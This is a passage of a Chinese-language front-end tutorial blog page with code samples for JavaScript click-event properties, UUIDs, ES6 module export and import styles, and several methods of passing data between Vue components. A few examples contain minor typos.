  <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"></span></span></span><br><span class="line"><span class="javascript"><span class="xml">            <span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">                <span class="built_in">document</span>.getElementById(<span class="string">&quot;main&quot;</span>).onclick = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">                    <span class="built_in">console</span>.log(e.target);<span class="comment">//&lt;div id=&quot;main&quot; class=&quot;sb js node&quot;&gt;&lt;span&gt;测试文字&lt;/span&gt;&lt;/div&gt;</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">                    <span class="built_in">console</span>.log(e.target.id);<span class="comment">//main</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">                    <span class="built_in">console</span>.log(e.target.tagName);<span class="comment">//DIV</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">                    <span class="built_in">console</span>.log(e.target.nodeName);<span class="comment">//DIV</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">                    <span class="built_in">console</span>.log(e.target.classList);<span class="comment">// [&quot;sb&quot;, &quot;js&quot;, &quot;node&quot;, value: &quot;sb js node&quot;]</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">                    <span class="built_in">console</span>.log(e.target.className);<span class="comment">//sb js node</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">                    <span class="built_in">console</span>.log(e.target.innerHTML);<span class="comment">//&lt;span&gt;测试文字&lt;/span&gt;</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">                    <span class="built_in">console</span>.log(e.target.innerText);<span class="comment">//测试文字</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">                &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">            &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">        </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;main&quot;</span> <span class="attr">class</span>=<span class="string">&quot;sb js node&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">span</span>&gt;</span>测试文字<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h3 id="UUID"><a href="#UUID" class="headerlink" title="UUID"></a>UUID</h3><p>UUID 是 通用唯一识别码（Universally Unique Identifier）的缩写，UUID是<a href="https://baike.baidu.com/item/%E5%9B%BD%E9%99%85%E6%A0%87%E5%87%86%E5%8C%96%E7%BB%84%E7%BB%87/779832">国际标准化组织</a>（<a href="https://baike.baidu.com/item/ISO/10400">ISO</a>）提出的一个概念。UUID是一个128比特的数值，这个数值可以通过一定的算法计算出来。为了提高效率，常用的UUID可缩短至16位。UUID用来识别属性类型，在所有空间和时间上被视为唯一的标识。一般来说，可以保证这个值是真正唯一的任何地方产生的任意一个UUID都不会有相同的值。使用UUID的一个好处是可以为新的服务创建新的标识符。这样一来，客户端在查找一个服务时，只需要在它的服务查找请求中指出与某类服务（或某个特定服务）有关的UUID，如果服务的提供者能将可用的服务与这个UUID相匹配，就返回一个响应。</p><h3 id="Es6的三种暴露方式"><a href="#Es6的三种暴露方式" class="headerlink" title="Es6的三种暴露方式"></a>Es6的三种暴露方式</h3><h4 id="多行暴露"><a href="#多行暴露" class="headerlink" title="多行暴露"></a>多行暴露</h4><p>导出</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//a.js</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">aa1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;分别导出1&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">aa2</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;分别导出2&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>导入</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.js</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//解构赋值</span></span><br><span class="line"><span class="keyword">import</span> &#123; aa1 , aa2 &#125; <span class="keyword">from</span> <span class="string">&#x27;a.js&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="统一暴露"><a href="#统一暴露" class="headerlink" title="统一暴露"></a>统一暴露</h4><p>导出</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//b.js</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bb1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;综合导出1&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bb2</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;综合导出2&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> &#123;bb1,bb2&#125;</span><br></pre></td></tr></table></figure><p>导入</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.js</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//解构赋值</span></span><br><span class="line"><span class="keyword">import</span> &#123;aa1,aa2&#125; <span class="keyword">from</span> <span class="string">&#x27;b.js&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="默认暴露"><a href="#默认暴露" class="headerlink" title="默认暴露"></a>默认暴露</h4><p>导出</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//c.js</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="function"><span class="keyword">function</span> <span class="title">cc</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;默认导出&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>导入</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.js</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//使用定义变量</span></span><br><span class="line"><span class="keyword">import</span> c <span class="keyword">from</span> <span class="string">&#x27;c.js&#x27;</span></span><br><span class="line">c.cc()</span><br></pre></td></tr></table></figure><h3 id="组件之间数据的传递"><a href="#组件之间数据的传递" class="headerlink" title="组件之间数据的传递"></a>组件之间数据的传递</h3><p>Vue 的组件作用域都是孤立的，不允许在子组件的模板内直接引用父组件的数据。必须使用特定的方法才能实现组件之间的数据传递。</p><p>首先用 vue-cli 创建一个项目，其中 App.vue 是父组件，components 文件夹下都是子组件。</p><p><img src="https://gitee.com/bluebanister/image/raw/master//img/202202171718861.png" alt="img"></p><h4 id="父传子"><a href="#父传子" class="headerlink" title="父传子"></a>父传子</h4><p>在 Vue 中，可以使用 props 向子组件传递数据</p><p>子组件部分：</p><p><img src="https://gitee.com/bluebanister/image/raw/master//img/202202171719408.png" alt="img"></p><p>这是 header.vue 的 HTML 部分，logo 是在 data 中定义的变量。</p><p>如果需要从父组件获取 logo 的值，就需要使用 <strong>props: [‘logo’]</strong></p><p><strong><img src="https://gitee.com/bluebanister/image/raw/master//img/202202171719838.png" alt="img"></strong></p><p><strong>在 props 中添加了元素之后，就不需要在 data 中再添加变量了</strong></p><p> 父组件部分：</p><p><img src="https://gitee.com/bluebanister/image/raw/master//img/202202171719453.png" alt="img"></p><p>在调用组件的时候，使用 v-bind 将 logo 的值绑定为 App.vue 中定义的变量 logoMsg</p><p><img src="https://gitee.com/bluebanister/image/raw/master//img/202202171719768.png" alt="img"></p><p>然后就能将App.vue中 logoMsg 的值传给 header.vue 了：</p><p><img src="https://gitee.com/bluebanister/image/raw/master//img/202202171719494.png" alt="img"></p><ul><li>props和$emit(常用)</li><li>$attrs和$listeners</li><li>中央事件总线（非父子组件间通信）</li><li>v-model</li><li>provide和inject</li><li>$parent和$children</li><li>vuex</li></ul><p><strong>1.props和$emit</strong></p><p>父组件向子组件传递数据是通过prop传递的，子组件传递数据给父组件是通过$emit触发事件来做到的.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//子组件child</span></span><br><span class="line">Vue.component(<span class="string">&#x27;child&#x27;</span>,&#123;</span><br><span class="line">    <span class="function"><span class="title">data</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="attr">mymessage</span>:<span class="built_in">this</span>.message</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">template</span>:<span class="string">`</span></span><br><span class="line"><span class="string">      &lt;div&gt;</span></span><br><span class="line"><span class="string">        &lt;input type=&quot;text&quot; v-model=&quot;mymessage&quot; @input=&quot;passData(mymessage)&quot;&gt; &lt;/div&gt;</span></span><br><span class="line"><span class="string">    `</span>,</span><br><span class="line">    <span class="attr">props</span>:[<span class="string">&#x27;message&#x27;</span>],<span class="comment">//设置props属性值，得到父组件传递过来的数据</span></span><br><span class="line">    <span class="attr">methods</span>:&#123;</span><br><span class="line">      <span class="function"><span class="title">passData</span>(<span class="params">val</span>)</span>&#123;</span><br><span class="line">        <span class="comment">//触发父组件中的事件，向父组件传值</span></span><br><span class="line">        <span class="built_in">this</span>.$emit(<span class="string">&#x27;getChildData&#x27;</span>,val)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line"><span class="comment">//父组件parent</span></span><br><span class="line">  Vue.component(<span class="string">&#x27;parent&#x27;</span>,&#123;</span><br><span class="line">    <span class="attr">template</span>:<span class="string">`</span></span><br><span class="line"><span class="string">      &lt;div&gt;</span></span><br><span class="line"><span class="string">        &lt;p&gt;this is parent compoent!&lt;/p&gt;</span></span><br><span class="line"><span class="string">        &lt;child :message=&quot;message&quot; v-on:getChildData=&quot;getChildData&quot;&gt;&lt;/child&gt;</span></span><br><span class="line"><span class="string">      &lt;/div&gt;</span></span><br><span class="line"><span class="string">    `</span>,</span><br><span class="line">    <span class="function"><span class="title">data</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="attr">message</span>:<span class="string">&#x27;hello&#x27;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">methods</span>:&#123;</span><br><span class="line">      <span class="comment">//执行子组件触发的事件</span></span><br><span class="line">      <span class="function"><span class="title">getChildData</span>(<span class="params">val</span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(val)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br></pre></td></tr></table></figure><p>总结：1).父组件传递了message数据给子组件，并且通过v-on绑定了一个getChildData事件来监听子组件的触发事件；</p><p>　　2).子组件通过props得到相关的message数据,最后通过this.$emit触发了getChildData事件</p><p><strong>2.$attrs和$listeners</strong></p><p>第一种方式用来处理父子组件之间的数据传，而如果父组件A下面有子组件B，组件B下面有组件C,这时如果组件A想传递数据给组件C怎么办呢？  如果采用第一种方法，我们必须让组件A通过prop传递消息给组件B，组件B在通过prop传递消息给组件C；要是组件A和组件C之间有更多的组件，那采用这种方式就很复杂了。Vue 2.4开始提供了$attrs和$listeners来解决这个问题，能够让组件A之间传递消息给组件C。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">Vue.component(&#x27;C&#x27;,&#123;</span><br><span class="line">    template:`</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        &lt;input type=&quot;text&quot; v-model=&quot;$attrs.messagec&quot; @input=&quot;passCData($attrs.messagec)&quot;&gt; &lt;/div&gt;</span><br><span class="line">    `,</span><br><span class="line">    methods:&#123;</span><br><span class="line">      passCData(val)&#123;</span><br><span class="line">        //触发父组件A中的事件</span><br><span class="line">        this.$emit(&#x27;getCData&#x27;,val)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">Vue.component(&#x27;B&#x27;,&#123;</span><br><span class="line">    data()&#123;</span><br><span class="line">      return &#123;</span><br><span class="line">        mymessage:this.message</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    template:`</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        &lt;input type=&quot;text&quot; v-model=&quot;mymessage&quot; @input=&quot;passData(mymessage)&quot;&gt;</span><br><span class="line">        &lt;!-- C组件中能直接触发getCData的原因在于 B组件调用C组件时 </span><br><span class="line">使        用 v-on 绑定了$listeners 属性 --&gt;</span><br><span class="line">        &lt;!-- 通过v-bind 绑定$attrs属性，C组件可以直接获取到A组件中传递下来的props</span><br><span class="line">（        除了B组件中props声明的） --&gt;</span><br><span class="line">        &lt;C v-bind=&quot;$attrs&quot; v-on=&quot;$listeners&quot;&gt;&lt;/C&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    `,</span><br><span class="line">    props:[&#x27;message&#x27;],//得到父组件传递过来的数据</span><br><span class="line">    methods:&#123;</span><br><span class="line">      passData(val)&#123;</span><br><span class="line">        //触发父组件中的事件</span><br><span class="line">        this.$emit(&#x27;getChildData&#x27;,val)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">Vue.component(&#x27;A&#x27;,&#123;</span><br><span class="line">    template:`</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        &lt;p&gt;this is parent compoent!&lt;/p&gt;</span><br><span class="line">        &lt;B :messagec=&quot;messagec&quot; :message=&quot;message&quot; v-on:getCData=&quot;getCData&quot; </span><br><span class="line">           v-on:getChildData=&quot;getChildData(message)&quot;&gt;&lt;/B&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    `,</span><br><span class="line">    data()&#123;</span><br><span class="line">      return &#123;</span><br><span class="line">        message:&#x27;hello&#x27;,</span><br><span class="line">        messagec:&#x27;hello c&#x27; //传递给c组件的数据</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    methods:&#123;</span><br><span class="line">      getChildData(val)&#123;</span><br><span class="line">        console.log(&#x27;这是来自B组件的数据&#x27;)</span><br><span class="line">      &#125;,</span><br><span class="line">      //执行C子组件触发的事件</span><br><span class="line">      getCData(val)&#123;</span><br><span class="line">        console.log(&quot;这是来自C组件的数据：&quot;+val)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br></pre></td></tr></table></figure><p> <strong>3. 中央事件总线（</strong><code>$emit</code>/<code>$on</code><strong>）</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">Vue.component(&#x27;brother1&#x27;,&#123;</span><br><span class="line">    data()&#123;</span><br><span class="line">      return &#123;</span><br><span class="line">        mymessage:&#x27;hello brother1&#x27;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    template:`</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        &lt;p&gt;this is brother1 compoent!&lt;/p&gt;</span><br><span class="line">        &lt;input type=&quot;text&quot; v-model=&quot;mymessage&quot; @input=&quot;passData(mymessage)&quot;&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    `,</span><br><span class="line">    methods:&#123;</span><br><span class="line">      passData(val)&#123;</span><br><span class="line">        //触发全局事件globalEvent</span><br><span class="line">        bus.$emit(&#x27;globalEvent&#x27;,val)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">  Vue.component(&#x27;brother2&#x27;,&#123;</span><br><span class="line">    template:`</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        &lt;p&gt;this is brother2 compoent!&lt;/p&gt;</span><br><span class="line">        &lt;p&gt;brother1传递过来的数据：&#123;&#123;brothermessage&#125;&#125;&lt;/p&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    `,</span><br><span class="line">    data()&#123;</span><br><span class="line">      return &#123;</span><br><span class="line">        mymessage:&#x27;hello brother2&#x27;,</span><br><span class="line">        brothermessage:&#x27;&#x27;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    mounted()&#123;</span><br><span class="line">      //绑定全局事件globalEvent</span><br><span class="line">      bus.$on(&#x27;globalEvent&#x27;,(val)=&gt;&#123;</span><br><span class="line">        this.brothermessage=val;</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">  //中央事件总线</span><br><span class="line">  var bus=new Vue();</span><br><span class="line">  var app=new Vue(&#123;</span><br><span class="line">    el:&#x27;#app&#x27;,</span><br><span class="line">    template:`</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        &lt;brother1&gt;&lt;/brother1&gt;</span><br><span class="line">        &lt;brother2&gt;&lt;/brother2&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    `</span><br><span class="line">  &#125;)</span><br></pre></td></tr></table></figure><p><strong>4. provide和inject</strong></p><p>　在 Vue.js 的 <code>2.2.0+</code> 版本中添加加了 provide 和 inject 选项。他们成对出现，用于父级组件向下传递数据。</p><p>父组件中通过provider来提供变量，然后在子组件中通过inject来注入变量。不论子组件有多深，只要调用了inject那么就可以注入provider中的数据。而不是局限于只能从当前父组件的prop属性来获取数据，只要在父组件的生命周期内，子组件都可以调用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">Vue.component(&#x27;child&#x27;,&#123;</span><br><span class="line">    inject:[&#x27;for&#x27;],//得到父组件传递过来的数据</span><br><span class="line">    data()&#123;</span><br><span class="line">      return &#123;</span><br><span class="line">        mymessage:this.for</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    template:`</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        &lt;input type=&quot;tet&quot; v-model=&quot;mymessage&quot;&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">  &#125;)</span><br><span class="line">  Vue.component(&#x27;parent&#x27;,&#123;</span><br><span class="line">    template:`</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        &lt;p&gt;this is parent compoent!&lt;/p&gt;</span><br><span class="line">        &lt;child&gt;&lt;/child&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    `,</span><br><span class="line">    provide:&#123;</span><br><span class="line">      for:&#x27;test&#x27;</span><br><span class="line">    &#125;,</span><br><span class="line">    data()&#123;</span><br><span class="line">      return &#123;</span><br><span class="line">        message:&#x27;hello&#x27;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br></pre></td></tr></table></figure><p><strong>5. v-model</strong></p><p> 　父组件通过v-model传递值给子组件时，会自动传递一个value的prop属性，在子组件中通过this.$emit(‘input’,val)自动修改v-model绑定的值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">Vue.component(&#x27;child&#x27;,&#123;</span><br><span class="line">    props:&#123;</span><br><span class="line">      value:String, //v-model会自动传递一个字段为value的prop属性</span><br><span class="line">    &#125;,</span><br><span class="line">    data()&#123;</span><br><span class="line">      return &#123;</span><br><span class="line">        mymessage:this.value</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    methods:&#123;</span><br><span class="line">      changeValue()&#123;</span><br><span class="line">        this.$emit(&#x27;input&#x27;,this.mymessage);//通过如此调用可以改变父组件上v-model绑定的值</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    template:`</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        &lt;input type=&quot;text&quot; v-model=&quot;mymessage&quot; @change=&quot;changeValue&quot;&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">  &#125;)</span><br><span class="line">  Vue.component(&#x27;parent&#x27;,&#123;</span><br><span class="line">    template:`</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        &lt;p&gt;this is parent compoent!&lt;/p&gt;</span><br><span class="line">        &lt;p&gt;&#123;&#123;message&#125;&#125;&lt;/p&gt;</span><br><span class="line">        &lt;child v-model=&quot;message&quot;&gt;&lt;/child&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    `,</span><br><span class="line">    data()&#123;</span><br><span class="line">      return &#123;</span><br><span class="line">        message:&#x27;hello&#x27;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">  var app=new Vue(&#123;</span><br><span class="line">    el:&#x27;#app&#x27;,</span><br><span class="line">    template:`</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        &lt;parent&gt;&lt;/parent&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    `</span><br><span class="line">  &#125;)</span><br></pre></td></tr></table></figure><p> <strong>6. $parent和$children</strong></p><p>在组件内部可以直接通过子组件$parent对父组件进行操作，父组件也可以通过$children对子组件进行操作.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">Vue.component(&#x27;child&#x27;,&#123;</span><br><span class="line">    props:&#123;</span><br><span class="line">      value:String, //v-model会自动传递一个字段为value的prop属性</span><br><span class="line">    &#125;,</span><br><span class="line">    data()&#123;</span><br><span class="line">      return &#123;</span><br><span class="line">        mymessage:this.value</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    methods:&#123;</span><br><span class="line">      changeValue()&#123;</span><br><span class="line">        this.$parent.message = this.mymessage;//通过如此调用可以改变父组件的值</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    template:`</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        &lt;input type=&quot;text&quot; v-model=&quot;mymessage&quot; @change=&quot;changeValue&quot;&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">  &#125;)</span><br><span class="line">  Vue.component(&#x27;parent&#x27;,&#123;</span><br><span class="line">    template:`</span><br><span class="line">      